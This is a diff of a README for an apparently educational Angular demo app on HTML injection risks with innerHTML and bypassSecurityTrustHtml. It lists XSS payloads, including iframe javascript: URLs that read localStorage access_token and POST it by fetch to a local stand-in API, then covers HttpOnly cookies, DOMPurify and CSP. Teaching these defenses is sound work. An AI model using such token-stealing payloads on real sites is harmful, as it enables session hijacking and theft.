@@ -1,27 +1,55 @@
 # AngularSecurity
 
-This project was generated with [Angular CLI](https://github.com/angular/angular-cli) version 17.3.8.
+Simple Angular application with HTML security use cases.
 
-## Development server
+## Description
 
-Run `ng serve` for a dev server. Navigate to `http://localhost:4200/`. The application will automatically reload if you change any of the source files.
+Whatever the method, you end up displaying some data that is **untrusted** because it comes from the user. This data can be a simple string, a URL, or even a piece of HTML code. The data is displayed with `[innerHTML]` directive, which is a security risk when the data is not sanitized.
 
-## Code scaffolding
+You explicitly disable the security by using the `bypassSecurityTrustHtml` method from the `DomSanitizer` service. This method tells Angular that you are aware of the security risk and that you are taking the responsibility of sanitizing the data yourself.
 
-Run `ng generate component component-name` to generate a new component. You can also use `ng generate directive|pipe|service|class|guard|interface|enum|module`.
+## How to test the application
 
-## Build
+Run the application with `ng serve` and navigate to `http://localhost:4200/`.
 
-Run `ng build` to build the project. The build artifacts will be stored in the `dist/` directory.
+Run the db server with `npm run dbserver` and navigate to `http://localhost:3000/`.
 
-## Running unit tests
+You can type HTML code in the input field and it will be rendered as HTML.
+Examples: 
 
-Run `ng test` to execute the unit tests via [Karma](https://karma-runner.github.io).
+- `<h1>Test</h1>` will render as a title.
+- `<script>alert('Hello')</script>` will **not** render as an alert.
+- `<img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" />` will render as an image.
+- `<iframe src="javascript:alert('Iframealert');">` will render as an iframe with an alert.
+- `<iframe src="javascript:alert(localStorage.getItem('access_token'))">` will render as an iframe with an alert with the token value.
+- `<iframe src="javascript:fetch('http://localhost:3000/data/1')">` will request a distant value.
+- `<iframe src="javascript:fetch('http://localhost:3000/data', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({name: localStorage.getItem('access_token'), price: 6})})">` will post the token to a distant api.
 
-## Running end-to-end tests
+Protect your cookies from javascript access by setting the `HttpOnly` flag on the server side.
 
-Run `ng e2e` to execute the end-to-end tests via a platform of your choice. To use this command, you need to first add a package that implements end-to-end testing capabilities.
+A cookie with the Secure attribute is only sent to the server with an encrypted request over the HTTPS protocol
 
-## Further help
+![Local cookies with httpOnly flag](doc_cookies.png)
 
-To get more help on the Angular CLI use `ng help` or go check out the [Angular CLI Overview and Command Reference](https://angular.io/cli) page.
+OSS tools for DOM security:
+
+- [DOMPurify](https://github.com/cure53/DOMPurify)
+- [CSP Reference](https://content-security-policy.com/)
+
+## How to secure the application with CSP
+
+- Add the `Content-Security-Policy` header to the server response.
+In the `index.html` file, add the following meta tag:
+
+```html
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src 'self'; script-src 'self' https://apis.google.com;">
+```
+
+You can add more directives to the CSP header to secure your application.
+You can also use your server implementation to add the CSP header to the response.
+
+[CSP Nginx](https://content-security-policy.com/examples/nginx/)
+
+## Credits
+
+Check this video by Manfred Steyer: [Angular Security live hacking with Martina Kraus](https://www.youtube.com/live/HAsWTXIMJnQ)
